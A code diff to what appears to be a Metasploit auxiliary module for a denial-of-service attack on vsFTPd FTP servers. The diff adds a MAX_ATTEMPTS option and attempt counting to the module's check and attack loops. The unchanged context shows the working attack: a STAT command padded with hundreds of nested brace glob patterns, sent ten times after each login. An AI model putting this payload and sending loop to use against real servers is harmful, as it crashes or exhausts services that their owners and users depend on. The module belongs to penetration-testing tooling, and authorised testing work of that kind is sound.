@@ -38,6 +38,10 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
     )
+
+    register_options([
+      OptInt.new('MAX_ATTEMPTS', [false, 'Maximum payload attempts before giving up (0 = unlimited)', 25])
+    ])
   end
 
   def check
@@ -53,12 +57,21 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("FTP banner: #{sanitize_ftp_response(banner)}") if banner
 
     s = ''
+    attempts = 0
+    max = datastore['MAX_ATTEMPTS']
     loop do
+      attempts += 1
+
       # get each line until our desired line shows or end line shows
       s = send_cmd(['STAT'], true)
       return Exploit::CheckCode::Unknown('No response received for STAT') unless s
 
       break if (s =~ /vsFTPd \d+\.\d+\.\d+/) || (s == "211 End of status\r\n")
+
+      if max > 0 && attempts >= max
+        print_error("Reached #{max} attempts")
+        break
+      end
     end
 
     vprint_status("STAT: #{s}")
@@ -86,9 +99,18 @@ class MetasploitModule < Msf::Auxiliary
     payload = 'STAT ' + '{{*},' * 487 + '{.}' + '}' * 487
     vprint_status("FTP DoS command: #{payload}")
 
+    attempts = 0
+    max = datastore['MAX_ATTEMPTS']
     loop do
-      print_status('Sending DoS command')
+      attempts += 1
+      if max > 0 && attempts >= max
+        print_error("Reached #{max} attempts without DoS")
+        break
+      end
+      print_status("Attempt: #{attempts}/#{max} - Sending DoS command")
+
       connect_login
+
       10.times do
         send_cmd([payload.to_s], false)
       end
